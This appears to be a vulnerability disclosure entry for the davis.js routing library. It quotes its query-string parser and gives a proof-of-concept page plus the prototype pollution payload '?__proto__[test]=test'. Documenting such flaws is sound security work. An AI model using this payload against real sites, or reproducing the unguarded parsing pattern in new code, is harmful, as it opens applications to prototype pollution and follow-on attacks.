## arg.js

URL: https://github.com/olivernn/davis.js

### Vulnerable code fragment

https://github.com/olivernn/davis.js/blob/master/davis.js#L1429-L1457

```js
Davis.utils.forEach(this.queryString.split("&"), function (keyval) {
    var paramName = decodeURIComponent(keyval.split("=")[0]),
        paramValue = keyval.split("=")[1],
        nestedParamRegex = /^(\w+)\[(\w+)?\](\[\])?/,
        nested;
    if (nested = nestedParamRegex.exec(paramName)) {
        var paramParent = nested[1];
        var paramName = nested[2];
        var isArray = !!nested[3];
        var parentParams = self.params[paramParent] || {};

        if (isArray) {
            parentParams[paramName] = parentParams[paramName] || [];
            parentParams[paramName].push(decodeURIComponent(paramValue));
            self.params[paramParent] = parentParams;
        } else if (!paramName && !isArray) {
            parentParams = self.params[paramParent] || []
            parentParams.push(decodeURIComponent(paramValue))
            self.params[paramParent] = parentParams
        } else {
            parentParams[paramName] = decodeURIComponent(paramValue);
            self.params[paramParent] = parentParams;
        }
    } else {
        self.params[paramName] = decodeURIComponent(paramValue);
    };

    });
};
```

### PoC
```html
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/davis.js/0.9.5/davis.min.js"></script>
<script>
     new Davis.Request(location.href);
</script>
```

```
?__proto__[test]=test
```